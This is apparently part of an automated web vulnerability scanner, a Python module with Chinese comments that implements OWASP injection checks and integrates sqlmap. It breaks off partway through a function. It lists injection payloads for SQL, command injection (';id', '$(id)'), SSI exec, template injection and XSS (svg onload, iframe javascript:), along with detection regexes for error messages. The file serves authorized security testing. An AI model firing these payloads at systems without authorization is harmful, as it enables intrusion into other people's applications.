# -*- coding: utf-8 -*-
"""
WSTG-INPV 注入（23 项）
=======================
注入类是整个清单里数量最多的一类，也是最容易被自动化工具吹成「覆盖了」
而实际上只跑了 sqlmap 一遍的一类。

本模块的实测原则：
  - 反射与报错两个方向都做，互为补充（盲注与静默过滤需要更重的工具，见降级说明）；
  - 判定「命中」必须同时具备：注入载荷被实际处理 + 出现该技术栈特有的特征；
    仅参数出现在响应里 ❌ 不算，那可能只是页面回显了搜索关键字；
  - 所有载荷都是只读语义，不做任何写入或删除；
  - 需要写操作才能验证的（存储型 XSS、批量赋值）一律走人工指引。
"""

from __future__ import annotations

import json
import re
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from engine.checks.base import (
    STACK_TRACE_PATTERNS, extract_params, find_forms, finding_evidence, is_real_hit,
    ok, found, pending, js_api_paths, probe_or_none, code_scan, sitewide_guard,
    reachability_scope, no_target_outcome, pick_logged_in_account,
)
from engine.registry import (
    RISK_DEEP, RISK_SAFE, RISK_STANDARD, DetectorContext, ReconOutcome,
    make_auto, make_finding, make_manual,
)
from engine import recon_identity as recon_id
from engine.spa import discover_routes

MARK = "aiscan9z8y7x"

#: 请求体注入通道的**共享**写请求预算（整轮累计，跨检测项）。
#: 定这个数的依据：请求体注入是写操作，每次都会真实落库；
#: 而注入类检查项有二十来个，若各自独立计数会叠加出远超预期的写量。
#: 10 次足够覆盖「文档声明的写接口 × 高危载荷」的第一轮，
#: 用尽后一律按「未验证」如实记录，不伪造结论。
_BODY_WRITE_BUDGET = 10

#: 已知高危 body 字段名（通用：任何系统的头像 / 用户名 / 评论 / URL 字段都可能
#: 成为 SSRF / SSTi / 存储型 XSS 入口）。当接口文档（Swagger）是假的或缺失时
#: （见 base.py:754 —— Juice Shop 的 /api-docs 是只有 /b2b/v2/orders 的 B2B 假
#: 文档，与真实接口面零重合），用这些字段名兜底补齐注入面。
#: 字段名取自跨系统通用高危面，**不针对单一靶场**。
_HIGH_RISK_BODY_FIELDS = (
    # SSRF 类：值会被服务端当作 URL 去 fetch
    "profileImage", "imageUrl", "logo", "avatar", "picture", "photo",
    "image", "url", "redirect", "callback", "webhook", "src", "link",
    "banner", "thumbnail",
    # SSTi / 模板注入类：值可能被拼进模板渲染
    "username", "name", "bio", "description", "comment", "message",
    "nickname", "displayName", "firstName", "lastName",
)

# 各技术栈的报错特征
ERROR_SIGNATURES = {
    "sql": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
        r"valid MySQL result", r"check the manual that corresponds to your (MySQL|MariaDB)",
        r"PostgreSQL.*ERROR", r"WARNING:\s+pg_", r"unterminated quoted string",
        r"Microsoft OLE DB Provider for SQL Server", r"OLE DB.*SQL Server",
        r"System\.Data\.SqlClient\.SqlException", r"Unclosed quotation mark after the character string",
        r"ORA-\d{5}", r"Oracle.*Driver", r"quoted string not properly terminated",
        # SQLite（D6：Juice Shop 实测报错形态是
        # `Error: SQLITE_ERROR: near "--": syntax error`，原有三条 SQLite
        # 特征一条都匹配不上 —— 特征表只认 Python/Java 驱动的包装形态，
        # 不认数据库自己吐的原生错误码）
        r"SQLITE_ERROR", r"unrecognized token", r"SQLITE_\w+ERROR",
        r"SQLite/JDBCDriver", r"SQLite3::", r"sqlite3\.OperationalError",
        r"org\.hibernate\.", r"org\.springframework\.dao", r"JDBCException",
        r"PDOException", r"SQLSTATE\[", r"syntax error at or near",
    ],
    "ldap": [
        r"LDAPException", r"javax\.naming\.", r"Protocol error occurred",
        r"Invalid DN syntax", r"Bad search filter", r"LDAP.*error",
    ],
    "xpath": [
        r"XPathException", r"XPath syntax error", r"Invalid XPath",
        r"javax\.xml\.xpath", r"SimpleXPathException",
    ],
    "ssti": [
        r"TemplateSyntaxError", r"jinja2\.exceptions", r"freemarker\.core",
        r"org\.apache\.velocity", r"VelocityException", r"twig.*Error",
        r"Smarty.*error", r"Thymeleaf", r"Pebble.*Exception", r"nunjucks",
    ],
    "code": [
        r"Notice:\s+Undefined", r"Fatal error:", r"Warning:\s+\w+\(\)\s+\[function\.",
        r"Parse error:\s+syntax error", r"java\.lang\.\w+Exception",
        r"System\.\w+Exception", r"ReferenceError:", r"TypeError:",
        r"NameError:", r"SyntaxError:", r"undefined method",
    ],
    "command": [
        r"sh: .*: (command )?not found", r"bash: .*: (command )?not found",
        r"/bin/sh:", r"cmd\.exe", r"'[^']+' is not recognized as an internal",
        r"cannot execute binary file", r"busybox", r"Windows PowerShell",
    ],
    "format": [
        r"Format string", r"printf.*error", r"Invalid format",
        r"FormatException", r"sprintf", r"系统找不到指定的路径",
    ],
    "imap": [
        r"IMAP.*error", r"SMTP.*error", r"javax\.mail", r"MailException",
        r"Invalid address", r"550 .*unknown", r"invalid command",
    ],
    "ssi": [
        r"\[an error occurred while processing this directive\]", r"SSI error",
        r"#exec.*error", r"shtml",
    ],
}

# 注入载荷（全部只读语义）
PAYLOADS = {
    "sql": ["'", "\"", "'--", "') --", "' AND '1'='1", "1' AND 1=1--", "1 OR 1=1"],
    "ldap": ["*", "*)(uid=*", "*)(|(uid=*", ")(cn=*"],
    "xpath": ["'", "\"", "1' or '1'='1", "count(//*)"],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{'7'*'7'}}", "{7*7}"],
    "code": [";", "'", "\"", "1/0", "{{", "]]"],
    "command": [";id", "|id", "&&id", "$(id)", "`id`", "| whoami", "; ping -c 1 127.0.0.1"],
    "format": ["%s%s%s", "%n%n%n", "%x%x%x", "%1$s%1$n"],
    "imap": ["%0d%0a", "\r\n", "a@b.com%0d%0aSubject: aiscan"],
    "ssi": ['<!--#exec cmd="id"-->', '<!--#echo var="DATE_LOCAL"-->'],
}

# SSTI 需要确认「表达式真的被求值了」，而不是原样回显
SSTI_EVAL_MARKERS = ["49", "343", "823543"]


def _body_target_index(ctx: DetectorContext) -> dict[tuple[str, str], dict[str, Any]]:
    """(url, 参数名) → 请求体目标描述。构建一次，缓存在 ctx 里。

    描述里带上 **必填字段** 与 **样例值**，这是注入器能构造出**合法**请求体的
    前提 —— 少一个必填字段，服务端在校验阶段就返回 400/500，载荷根本
    没被应用处理，于是「无反射」被记成「无漏洞」。
    """
    cached = None
    try:
        cached = ctx._cache.get("_spec_body_index")
    except Exception:  # noqa: BLE001
        cached = None
    if isinstance(cached, dict):
        return cached
    idx: dict[tuple[str, str], dict[str, Any]] = {}
    try:
        from engine import openapi as _oa  # noqa: PLC0415
        res = _oa.cached_result(ctx) or _oa.discover(ctx)
        base = ctx.target_url.rstrip("/")
        for e in (_oa_spec_endpoints(res) or []):
            url = _oa_field(e, "url_path") or ""
            method = str(_oa_field(e, "method") or "GET").upper()
            full = url if str(url).startswith("http") else (base + "/" + str(url).lstrip("/"))
            names = list(_oa_field(e, "body_params") or [])
            if not names:
                continue
            rec = {
                "method": method,
                "fields": names,
                "required": list(_oa_field(e, "body_required") or []),
                "example": dict(_oa_field(e, "body_example") or {}),
            }
            for p in names:
                idx[(full, p)] = rec
    except Exception:  # noqa: BLE001
        idx = {}
    # 补充：接口文档常是假的（Juice Shop v20 的 /api-docs 只有 /b2b/v2/orders，
    # 与真实接口面零重合，base.py:754 已记此坑）。而前端 bundle 真的会去请求的
    # API 路径 + 已知高危字段名，才覆盖真实注入面。这里把「前端推断的高危 body
    # 字段」补进索引，让注入器能走登录态 body 通道打这些 Swagger 漏掉的入口
    # （profileImage/username/imageUrl 等），惠及 INPV-02/18/19 等检测体。
    # 字段名与端点关键词均为跨系统通用高危面，**不针对单一靶场**。
    try:
        _eps = js_api_paths(ctx)
        _ep_re = re.compile(
            r"(user|profile|account|basket|feedback|comment|review|order|"
            r"avatar|media|upload|image|contact|register|signup|nickname|bio|"
            r"username|message)", re.I)
        _added = 0
        for ep in _eps:
            if _added >= 40:
                break
            if not _ep_re.search(ep):
                continue
            # 数字结尾的是单对象写接口（如 /api/Users/1）→ PUT；
            # 其余（如 /api/BasketItems 复数集合）保持 POST，构造的 body 如
            # 不被该接口接受会被忽略/拒绝，无副作用。
            is_obj = bool(re.search(r"/\d+$", ep))
            method = "PUT" if is_obj else "POST"
            for f in _HIGH_RISK_BODY_FIELDS:
                if (ep, f) in idx:
                    continue
                idx[(ep, f)] = {"method": method, "fields": [f],
                                "required": [], "example": {f: ""}}
                _added += 1
    except Exception:  # noqa: BLE001
        pass
    try:
        ctx._cache["_spec_body_index"] = idx
    except Exception:  # noqa: BLE001
        pass
    return idx


def _oa_field(obj: Any, name: str, default: Any = None) -> Any:
    if isinstance(obj, dict):
        return obj.get(name, default)
    return getattr(obj, name, default)


def _oa_spec_endpoints(res: Any) -> list[Any]:
    return list(_oa_field(res, "endpoints") or [])


class _BodyProbe:
    """把 `data_submit()` 返回的 dict 包成 probe 的形状。

    **为什么必须有这一层**：注入类判定全部写成
    `getattr(probe, "body_snippet", "")`，而 `data_submit()` 返回的是
    一个普通 dict —— `getattr(dict, "body_snippet", "")` 恒为 `""`。
    于是请求**真的发了、响应也真的回来了**，判定却读到一份空正文，
    结论记成「未发现反射」。这是一次「做了但没人看见」的静默失效：
    请求量照常产生，产出为零。包一层适配器，让既有判定逻辑原样可用。
    """

    def __init__(self, data: dict[str, Any]):
        d = data or {}
        self._d = d
        self.status = int(d.get("status", 0) or 0)
        self.headers = dict(d.get("headers") or {})
        self.final_url = str(d.get("final_url") or "")
        self.elapsed_ms = int(d.get("elapsed_ms", 0) or 0)
        self.error = str(d.get("error") or "")

    @property
    def body(self) -> str:
        return str(self._d.get("body") or "")

    @property
    def body_snippet(self) -> str:
        return self.body

    def get(self, key: str, default: Any = None) -> Any:
        if isinstance(self._d, dict):
            return self._d.get(key, default)
        return default


def _inject(ctx: DetectorContext, url: str, param: str, payload: str):
    """把载荷送进一个参数。**通道由 `in` 决定**，不是一律塞查询串。

    为什么必须分流：请求体字段如果在查询串里发，服务端要么忽略它
    （载荷未被处理 → 假阴性），要么整个请求不合法（400/500 → 假阴性）。
    两种情况下我们都会记一条「通过」，而那是一次**没有发生的测试**。

    body 通道走 `ctx.data_submit()`，因此受三重约束：deep 档 +
    台账授权写 + 共享预算上限。档位不够时不发请求，由调用方的
    结论如实说明「未验证」。
    """
    idx = _body_target_index(ctx)
    rec = idx.get((url, param))
    if rec is not None and rec.get("method") not in ("GET", "HEAD", "OPTIONS"):
        return _inject_body(ctx, url, rec, param, payload)

    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        return None
    qs[param] = [payload]
    test_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
    try:
        return ctx.get(test_url), test_url
    except Exception:  # noqa: BLE001
        return None


def _inject_body(ctx: DetectorContext, url: str, rec: dict[str, Any],
                 param: str, payload: str):
    """构造一个**合法**的 JSON 请求体并注入载荷。

    合法性来自接口文档声明的字段与样例：先按样例填满所有声明字段，
    再用载荷覆盖目标字段。少填一个必填字段就会让服务端提前拒绝 ——
    那种情况下「没检出」说明的是请求不合法，不是系统安全。
    """
    body: dict[str, Any] = {}
    for f in (rec.get("fields") or []):
        ex = (rec.get("example") or {}).get(f)
        body[f] = "" if ex is None else ex
    body[param] = payload
    # 登录态必须带上：匿名写请求多数会直接被拒（401/500），
    # 载荷根本没进业务逻辑，差分出来的「无差异」是假的。
    account = pick_logged_in_account(ctx)
    try:
        out = ctx.data_submit(url, body, method=rec.get("method") or "POST",
                              as_json=True, budget_key="spec_body_inject",
                              account=account,
                              max_total=_BODY_WRITE_BUDGET)
    except PermissionError as e:
        # 档位 / 台账 / 预算任一不放行：如实返回 None，调用方按「未验证」记。
        ctx.note(f"[接口文档] 请求体注入未执行：{str(e)[:160]}")
        return None
    except Exception as e:  # noqa: BLE001
        ctx.note(f"[接口文档] 请求体注入异常：{type(e).__name__}: {str(e)[:120]}")
        return None
    return _BodyProbe(out), url


def _error_based(ctx: DetectorContext, kind: str, label: str, item_id: str,
                 severity: str, max_params: int = 8):
    """通用的报错型注入检测器工厂。"""
    patterns = ERROR_SIGNATURES.get(kind, [])
    params = extract_params(ctx)
    if not params:
        return no_target_outcome(ctx, "带参数的接口端点", probes=2, evidence_kind="无候选参数")

    probes = 0
    findings = []
    for p in params[:max_params]:
        url, pname = p["url"], p["param"]
        if not url.startswith("http") or ctx.domain not in url:
            continue
        # 先取基线，避免把页面本来就有的报错误判为注入导致
        try:
            base = ctx.get(url)
        except Exception:  # noqa: BLE001
            continue
        base_body = getattr(base, "body_snippet", "") or ""
        base_hits = {mk for mk in patterns if re.search(mk, base_body, re.I)}

        # 全量载荷都要执行（D6 曾用 [:4] 截断 —— sql 定义了 7 条只有前 4 条
        # 被执行，后 3 条配了没人读；Juice Shop 实测 `'--`（第 3 条）能触发
        # SQLITE_ERROR，若截断的边界挪两格就整体漏报）。载荷全部只读语义，
        # 请求量 = 参数数 × 载荷数，受全局限速约束。
        for payload in PAYLOADS.get(kind, []):
            probes += 1
            r = _inject(ctx, url, pname, payload)
            if r is None:
                continue
            probe, test_url = r
            body = getattr(probe, "body_snippet", "") or ""
            if not body:
                continue
            for mk in patterns:
                if re.search(mk, body, re.I) and mk not in base_hits:
                    findings.append(make_finding(
                        item_id, f"{label}（参数 {pname}）",
                        ctx.target_name, endpoint=url, method="GET", param=pname,
                        severity=severity, confidence="High", evidence_level="A",
                        description=(f"向参数 `{pname}` 提交特殊字符后，服务端返回了"
                                     f"{label}特有的报错信息，说明该参数的值未经处理"
                                     "就被送进了后端解析流程。"),
                        technical_detail=(f"受影响参数：{pname}\n"
                                          f"测试载荷类型：注入字符（只读语义）\n"
                                          f"命中报错特征：{mk}\n"
                                          f"响应片段（已截断，已脱敏）：\n{body[:900]}"),
                        impact=("报错泄露了后端技术栈与语句结构，攻击者可据此"
                                "构造精确的注入语句，读取数据库中的业务数据、"
                                "绕过认证条件，或进一步取得服务器权限。"),
                        reproduction=(f"原始请求：GET {url}\n"
                                      f"改为：{pname}=<该类型注入字符>\n"
                                      f"响应中出现技术栈报错即确认。"),
                        remediation=("① 使用参数化查询 / 预编译语句，杜绝字符串拼接；"
                                     "② 对输入做类型与格式白名单校验；"
                                     "③ 关闭生产环境的详细报错，统一返回通用错误页"
                                     "（报错本身不是漏洞，但它把注入点变成了明牌）；"
                                     "④ 数据库账号按最小权限配置。"),
                        compliance="等保2.0 安全计算环境-入侵防范 / CWE-89",
                        evidence=[finding_evidence("response", body[:1500],
                                                   f"{label}报错特征 {mk}")],
                        grading_basis=f"实测服务端返回{label}报错，注入点确证，定{severity}",
                    ))
                    break
            if findings:
                break
        if findings:
            break

    note = (f"对 {len(params[:max_params])} 个参数测试 {probes} 个载荷，"
            f"{'命中' + label if findings else '未命中'}")
    return found(note, findings, probes=probes, evidence_kind="报错型注入实测")


def _sqlmap_supplement(ctx: DetectorContext, already_hit: bool) -> tuple[str, Any]:
    """注入检测的第二层：用 sqlmap 做多手法交叉验证。

    为什么必须有这一层
    --------------------------------------------------------------------------
    报错型手法只能发现「报错被原样回显」的注入。真实系统只要把报错统一兜底，
    这一层就一无所获 —— 而**注入依然存在**。于是整条检查项判「通过」，
    报告写「未发现 SQL 注入」。这是漏报，且是最难自查的一类漏报：
    检测器确实跑了、确实没报错，看起来一切正常。

    WSTG-INPV-05 清单声明的检测对象是「SQL 注入」，不是「报错型 SQL 注入」。
    只做报错型就宣称覆盖了该项，属于**声明与实现不符**（本项目反复出现过
    同一类问题）。本函数补的就是这个缺口：布尔盲注 / 时间盲注 / UNION 等
    没有回显的注入，由 sqlmap 覆盖。

    返回 (note 后缀, 发现或 None)。
    每个「没执行」的分支都必须给出理由 —— 「没测」和「测了没有」是两件事。
    """
    from engine import sqlmap_probe as smp

    plan = smp.plan_for(ctx)
    if not plan.enabled:
        return f"；外部注入验证未执行：{plan.reason}", None

    if already_hit:
        # 已由内置手法确证，再跑一遍 sqlmap 只是重复打目标、拉长扫描时间，
        # 不增加结论强度（结论已经是「注入确证」这个上限了）。
        return ("；已由内置手法确证注入，未再调用 sqlmap（避免重复请求），"
                "如需确认可利用深度可手工执行 sqlmap"), None

    params = extract_params(ctx)
    pts = [{"url": p["url"], "param": p["param"]} for p in params
           if str(p.get("url", "")).startswith("http")
           and ctx.domain in str(p.get("url", ""))]
    if not pts:
        return ("；外部注入验证未执行：未发现带参数的候选端点"
                "（无参数可测时 sqlmap 无从下手）"), None

    out = smp.prove_points(ctx, pts)
    if out.proven:
        scope, _, scope_why = reachability_scope(ctx)
        is_public = scope == "公网可达"
        props = ("；".join(out.techniques) if out.techniques else "（未标注手法）")
        detail_txt = (f"受影响参数：{out.param or pts[0].get('param', '?')}\n"
                      f"验证工具：sqlmap（多手法交叉验证）\n"
                      f"判定手法：{props}\n"
                      f"后端数据库：{out.dbms or '（未识别）'}\n"
                      f"可达性判定：{scope}\n判定依据：{scope_why}\n"
                      f"复现命令：{out.cmd_preview}\n"
                      f"说明：本项只读取数据库版本等元信息用于证明数据面可达，"
                      f"未导出任何业务数据（--dump / --file-read / --os-* 类开关"
                      f"在本工具中为禁用项，调用前有断言拦截）。")
        return ("；内置报错型手法未命中，但 sqlmap 多手法交叉验证确证注入存在"
                f"（手法：{props}）", make_finding(
            "WSTG-INPV-05", f"SQL 注入（{props}）",
            ctx.target_name, endpoint=str(pts[0].get("url", "")),
            method="GET", param=str(out.param or pts[0].get("param", "")),
            severity="高危" if is_public else "中危",
            confidence="High", evidence_level="A",
            description=(
                "参数在服务端被拼接进 SQL 语句执行：向该参数提交注入载荷后，"
                f"服务端行为随载荷条件发生变化，sqlmap 据此判定注入成立（{props}）。"
                "该类注入**不一定回显报错**（本次内置报错型手法即未命中），"
                "因此不能靠「有没有报错」判断是否存在注入。"
                + ("" if is_public else
                   f"目标可达范围为「{scope}」，本条不计入公网风险，"
                   "实际危害取决于内网访问控制。")),
            technical_detail=detail_txt,
            impact=("注入点可用于绕过应用的查询条件，读取数据库中的业务数据"
                    "（用户资料、订单、凭据哈希等），随数据库账号权限不同"
                    "还可能写入数据或读写服务器文件。"
                    "本次仅取回数据库版本以证明可达性，未继续扩大读取范围。"),
            reproduction=(f"{out.cmd_preview}\n"
                          "# 说明：以上命令为只读复现（--banner 仅取版本）；\n"
                          "# 若命令里出现 cookie=__FILL_ME__，那是本工具故意留的占位 ——\n"
                          "#   带认证的目标需要会话 Cookie，而本报告是要外发的交付物，\n"
                          "#   里面不能附一份可直接冒用的凭据。复测时把 __FILL_ME__\n"
                          "#   替换成你自己的会话串（可从浏览器开发者工具复制）。\n"
                          "# 自行复测时请勿添加 --dump / --os-shell / --file-read 等开关。"),
            remediation=("① 全部查询改用参数化 / 预编译语句，杜绝字符串拼接；"
                         "② 输入做类型与格式白名单校验；"
                         "③ 数据库账号按最小权限配置，禁止堆叠查询与文件读写权限；"
                         "④ 统一错误页只能降低「被发现」的概率，"
                         "不能替代参数化查询；"
                         "⑤ 修复后重新扫描确认该项不再命中。"),
            compliance="等保2.0 安全计算环境-入侵防范 / CWE-89 / OWASP A03",
            evidence=[finding_evidence("response", "\n".join(out.evidence_lines()),
                                       "sqlmap 判定输出（仅元信息）")],
            grading_basis=("sqlmap 多手法交叉验证确证注入成立，且取回 DBMS 版本"
                           "（服务端才能提供的信息），实测数据面可达；"
                           + ("目标公网可达，定高危" if is_public
                              else "目标仅内网可达，不计入公网风险，定中危")),
        ))

    return f"；本项已由内置报错型手法与 sqlmap 双重验证，未确证注入（{out.reason}）", None


# ======================================================================
# WSTG-INPV-01 反射型跨站脚本（XSS）
# ======================================================================
# 路由语义 → 该路由可能接受的查询参数名。
#
# 「凭空猜路由」是黑盒大忌，但「路由确实存在、只是从没带参数出现过」
# 是另一回事：第十轮实测 `#/search` 在页面上真实存在，却因为没有任何
# 一处出现过 `#/search?q=`，候选列表为空 → 渲染验证 0 项 → INPV-01 报
# 「通过」而 Reflected XSS 真实存在。不补这一环，SPA 上的反射型 XSS
# 结构性测不到。所以约束是两条，缺一不可：
#   ① 路由必须真实出现（本次渲染过 / DOM 里有 / JS 里有），绝不凭空造；
#   ② 参数名只是**候选**，必须由对照实验证明它真的被渲染消费（见 inpv01），
#      证明不了就不算发现（红线 9：孤证不能当结论）。
_ROUTE_PARAM_HINTS: tuple[tuple[str, tuple[str, ...]], ...] = (
    (r"(search|find|query|result)", ("q", "query", "search", "searchTerm", "keyword", "term")),
    (r"(track|order|deliver|shipping)", ("id", "orderId", "trackingId")),
    (r"(product|detail|item|goods|sku)", ("id", "productId")),
    (r"(profile|user|account|customer|member)", ("id", "userId", "email")),
    (r"(basket|cart)", ("id", "basketId")),
    (r"(complaint|feedback|contact|review|comment)", ("id", "message", "comment", "text")),
    (r"(login|signin|register|signup)", ("email", "returnUrl", "redirect")),
    (r"(admin|manage|console|dashboard)", ("id", "q")),
)


def _hash_route_params(ctx: DetectorContext) -> list[dict[str, str]]:
    """SPA「hash 路由 × 参数名」的候选组合：字面出现优先，语义推断兜底。

    返回项形如 {"route", "param", "basis"}，`basis` 说明这个组合的来历 ——
    报告里必须能看出某条候选是「页面上真出现过」还是「按语义推断的」，
    否则读者无法判断这条发现的证据强度。
    """
    blobs = [str((ctx.fp_result or {}).get("_render_html") or "")]
    blobs += [str(u) for u in (ctx.js_result.get("urls") or [])]
    blobs += [str(p) for p in ((ctx.js_result.get("spa") or {}).get("pages") or [])]
    # 打包产物正文 —— 前端路由表**只存在于这里**，HTML 里没有。
    # 少了这一路，Juice Shop 这类目标的路由清单是空的，
    # 于是「反射发生在前端渲染」的入口一个都测不到，且不会报错。
    blobs += [str(x) for x in (ctx.js_result.get("bodies") or [])[:40]]
    blobs += [str(x) for x in (ctx.js_result.get("inline_scripts") or [])[:20]]
    literal: list[dict[str, str]] = []
    routes: list[str] = []
    seen: set[str] = set()
    seen_route: set[str] = set()
    for blob in blobs:
        if not blob:
            continue
        for m in re.finditer(r"#/([A-Za-z0-9_\-/]{1,60})\?([A-Za-z0-9_\-=&%]{1,120})",
                             blob):
            route, qs = m.group(1).strip("/"), m.group(2)
            for k in parse_qs(qs, keep_blank_values=True):
                key = f"{route}?{k}"
                if key in seen:
                    continue
                seen.add(key)
                literal.append({"route": route, "param": k, "basis": "字面出现"})
        for m in re.finditer(r"#/([A-Za-z0-9_\-/]{1,60})", blob):
            r = m.group(1).strip("/")
            if r and r not in seen_route:
                seen_route.add(r)
                routes.append(r)

    # 打包产物里的路由定义（Angular / React / Vue 三种写法）
    for r in discover_routes(blobs):
        if r not in seen_route:
            seen_route.add(r)
            routes.append(r)

    # 本次实际渲染成功的路由（多路由渲染产出）—— 最高可信来源，排在最前
    for r in reversed(list((ctx.fp_result or {}).get("_render_routes") or [])):
        r = str(r).strip("/")
        if r and r not in seen_route:
            seen_route.add(r)
            routes.insert(0, r)

    # ⚠ 排序必须是「先按语义类别、再按路由」，不能「先按路由、再按语义」。
    #
    # 打包产物里的路由表有 40+ 条，按出现顺序排的话 `search` 落在第 26 位 ——
    # 而调用方只取前 3 个（`inpv01` 的渲染预算）。按路由顺序排就会把
    # `administration` / `accounting` / `about` 排在前面，
    # 真正会反射用户输入的 `search` 一次都测不到，然后记一条「通过」。
    # **顺序本身就是结论的一部分**：先测哪几个入口，决定了能测到什么。
    inferred: list[dict[str, str]] = []
    for pat, names in _ROUTE_PARAM_HINTS:
        for r in routes:
            if not re.search(pat, r.lower()):
                continue
            for n in names:
                key = f"{r}?{n}"
                if key in seen:
                    continue
                seen.add(key)
                inferred.append({"route": r, "param": n, "basis": f"语义推断（/{r}）"})
            if len(inferred) >= 6:
                break
        if len(inferred) >= 6:
            break
    return (literal + inferred)[:6]


@make_auto("WSTG-INPV-01", name="反射型 XSS 检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="反射与编码实测",
           detector_ref="checks/injection.py:inpv01")
def inpv01(ctx: DetectorContext):
    params = extract_params(ctx)
    if not params:
        return no_target_outcome(ctx, "带参数的接口端点", probes=2, evidence_kind="无候选参数")

    probes = 0
    findings = []
    for p in params[:10]:
        url, pname = p["url"], p["param"]
        if not url.startswith("http") or ctx.domain not in url:
            continue
        marker = f"{MARK}<>'\""
        probes += 1
        r = _inject(ctx, url, pname, marker)
        if r is None:
            continue
        probe, _ = r
        body = getattr(probe, "body_snippet", "") or ""
        # 判定：尖括号与引号被原样输出（未做 HTML 实体编码）
        raw_reflect = re.search(re.escape(marker), body)
        if not raw_reflect:
            continue
        # 排除「在无害上下文里」（如 <title> 中），给出更强的证据：可闭合标签
        context_probe = f'{MARK}"><svg/onload=1>'
        probes += 1
        r2 = _inject(ctx, url, pname, context_probe)
        executable = False
        if r2 is not None:
            probe2, _ = r2
            b2 = getattr(probe2, "body_snippet", "") or ""
            if f'"><svg/onload=1>' in b2 or "<svg/onload=1>" in b2:
                executable = True
        findings.append(make_finding(
            "WSTG-INPV-01", f"反射型 XSS（参数 {pname}）",
            ctx.target_name, endpoint=url, method="GET", param=pname,
            severity="高危" if executable else "中危",
            confidence="High", evidence_level="A",
            description=(f"参数 `{pname}` 的值被原样输出到页面 HTML 中，"
                         "尖括号与引号没有被编码。"
                         + ("进一步测试确认：注入的标签结构被完整保留，浏览器会把它当作标签解析。"
                            if executable else "当前上下文未能确认可直接闭合标签。")),
            technical_detail=(f"受影响参数：{pname}\n"
                              f"注入内容：{marker}（未编码输出）\n"
                              + (f"闭合测试：{context_probe} → 原样出现\n" if executable else "")
                              + f"响应片段（已截断）：\n{body[:900]}"),
            impact=("攻击者可以构造一个带恶意参数的链接发给用户，"
                    "用户点击后浏览器执行攻击者的脚本。"
                    "脚本可以读取该用户在当前站点的全部数据、以用户身份执行操作、"
                    "甚至读取会话 Cookie（若未设 HttpOnly）。"
                    "属于可直接获取数据与权限的漏洞。"),
            reproduction=(f"在浏览器中打开：\n{url}（将 {pname} 替换为 "
                          f'{MARK}"><svg/onload=alert(1)>）\n'
                          "若弹出对话框即确认。"),
            remediation=("① 输出到 HTML 上下文时做实体编码（&lt; &gt; &quot; &#39;）；"
                         "② 输出到 JS / 属性 / URL 上下文分别使用对应的编码方式；"
                         "③ 优先使用模板引擎的自动转义，避免手工拼接 HTML；"
                         "④ 叠加 CSP 作为纵深防御（禁止内联脚本）；"
                         "⑤ 会话 Cookie 保持 HttpOnly，降低一次 XSS 的后果。"),
            compliance="等保2.0 安全计算环境-入侵防范 / CWE-79",
            evidence=[finding_evidence("response", body[:1500], f"反射型 XSS {pname}")],
            grading_basis=("实测参数原样输出到 HTML 且标签结构完整，可执行脚本，定高危"
                           if executable else "实测参数原样输出未编码，上下文可执行性未完全确认，定中危"),
        ))
        if len(findings) >= 2:
            break

    # ---------- SPA hash 路由参数的渲染验证 ----------
    # 服务端反射测试在 SPA 上有结构性盲区：`/#/search?q=` 这类参数
    # **不会发给服务器**（# 后的内容不进 HTTP 请求），反射发生在前端
    # 渲染时。服务端 probe 只会拿到一份 JSON / 骨架页，「未发现反射」
    # 由此变成假阴性 —— 2026-10-10 第十轮实测，INPV-01 报「通过」
    # 而 Reflected XSS 真实存在。判据：构造带标记的 hash URL → 无头
    # 浏览器渲染 → 在渲染 DOM 里查标记是否以**标签形态**原样出现。
    # 成本约束：一次渲染 2~8 秒，只取前 3 个路由参数；需要 deep 档
    # （渲染有副作用，红线 30），档位不够时如实说明而不是装作测过。
    hash_note = ""
    tried_routes = 0
    ok_routes = 0
    if not findings and ctx.risk_allowed(RISK_DEEP):
        # 上限 3 组（每组 2 次渲染）：渲染是最贵的一步，一旦渲染器在高负载下
        # 变慢，多出来的每一次都会抬高整轮失败的概率 —— 宁可少测两个参数，
        # 也要让真测的那几次跑得完（测不完的渲染 = 覆盖度说明，不是结论）。
        #
        # 从 2 组提到 3 组：候选列表现在来自「打包产物里的路由表」，
        # 排序可靠（`search?q` 语义命中率最高），多试一组换来的是
        # 「反射型 XSS 到底有没有」这个结论从无到有。
        routes = _hash_route_params(ctx)[:3]
        if routes:
            rendered0 = str((ctx.fp_result or {}).get("_render_html") or "")
            from engine.render import plan_for, render_entry  # noqa: PLC0415
            base = ctx.target_url.split("#")[0].rstrip("/")
            tag_re = r"<iframe[^>]{0,160}javascript:"

            def _render(value: str) -> tuple[Any, str]:
                u = f"{base}/#/{rt['route']}?{rt['param']}={value}"
                try:
                    o = render_entry(
                        u, profile_key="deep", status=200,
                        content_type="text/html",
                        before_html=rendered0[:200_000] or ctx.baseline_body[:200_000],
                        plan=plan_for("deep"))
                except Exception:  # noqa: BLE001
                    return None, u
                return o, u

            for rt in routes:
                probes += 2
                tried_routes += 1
                # 对照实验（红线 9）：同一个路由同一个参数，先给中性值。
                # 只有「中性值不出现标签结构、载荷值出现」才算输入被渲染消费；
                # 两边都出现说明那是页面自带的 iframe，与输入无关。
                ctrl, _ = _render("aiscanneutral1")
                o, url = _render(f"<iframe%20src%3Djavascript:{MARK}>")
                if o is None:
                    hash_note = "；hash 路由渲染验证未能执行（渲染器异常）"
                    break
                if not getattr(o, "ok", False) or not getattr(o, "html", ""):
                    hash_note = "；hash 路由渲染验证未能完成（渲染失败，覆盖度下降）"
                    continue
                # 渲染**真的跑完了**才计数 —— 之前这里把「尝试过」当成
                # 「验证过」：note 会写成「已验证 N 组」，而实际上 N 组
                # 全部渲染失败。跑了 = 有结论，没跑完 = 没有结论，两件事。
                ok_routes += 1
                if not re.search(tag_re, o.html, re.I):
                    continue
                if (ctrl is not None and getattr(ctrl, "ok", False)
                        and re.search(tag_re, getattr(ctrl, "html", "") or "", re.I)):
                    continue
                findings.append(make_finding(
                    "WSTG-INPV-01",
                    f"反射型 XSS（SPA 路由参数 /{rt['route']}?{rt['param']}）",
                    ctx.target_name, endpoint=url, method="GET",
                    param=rt["param"],
                    severity="高危", confidence="High", evidence_level="A",
                    description=(
